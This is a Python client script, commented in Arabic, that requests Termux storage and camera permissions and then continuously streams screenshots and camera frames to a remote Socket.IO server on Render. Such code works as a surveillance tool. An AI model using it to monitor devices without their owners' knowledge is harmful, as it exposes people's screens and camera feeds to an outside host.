import socketio
import base64
import time
import io
import os
from PIL import ImageGrab

# --- إعدادات الاتصال ---
# ملاحظة: استبدل اللينك ده بلينك Render بتاعك أول ما يطلع
SERVER_URL = "https://advanced-system.onrender.com" 

sio = socketio.Client()

def get_permissions():
    """طلب صلاحيات النظام من تيرماكس أو الأندرويد"""
    print("🔔 Requesting System Permissions...")
    # طلب إذن الملفات (بيظهر في تيرماكس زي ما شفت في الصورة)
    os.system("termux-setup-storage") #
    # محاولة تشغيل الكاميرا لإجبار النظام على إظهار نافذة الـ Allow
    os.system("termux-camera-info > /dev/null 2>&1")

try:
    import cv2
    HAS_CV2 = True
except:
    HAS_CV2 = False
    print("⚠️ OpenCV not found. Camera stream disabled.")

@sio.event
def connect():
    print("✅ Connected to Krollos Global Server!")

@sio.event
def disconnect():
    print("❌ Disconnected from Server.")

def start_streaming():
    get_permissions()
    
    try:
        sio.connect(SERVER_URL)
    except:
        print("❌ Connection Failed. Check if Render is Live.")
        return

    # إعداد الكاميرا
    cap = cv2.VideoCapture(0) if HAS_CV2 else None

    while True:
        try:
            # 1. بث الشاشة (Screen Stream)
            # جودة 20% عشان البث يبقى سريع ومن غير تقطيع
            screen = ImageGrab.grab()
            screen = screen.resize((360, 640)) # تغيير الحجم لسرعة النقل
            s_buf = io.BytesIO()
            screen.save(s_buf, format='JPEG', quality=20)
            sio.emit('s_frame', base64.b64encode(s_buf.getvalue()).decode())

            # 2. بث الكاميرا (Camera Stream)
            if HAS_CV2 and cap and cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    # تقليل حجم الصورة لسرعة البث
                    _, c_buf = cv2.imencode('.jpg', cv2.resize(frame, (320, 240)), [1, 20])
                    sio.emit('v_frame', base64.b64encode(c_buf).decode())

            time.sleep(0.1) # تأخير بسيط لتقليل استهلاك البطارية والرام
        except Exception as e:
            print(f"⚠️ Error during stream: {e}")
            break

if __name__ == "__main__":
    start_streaming()
  
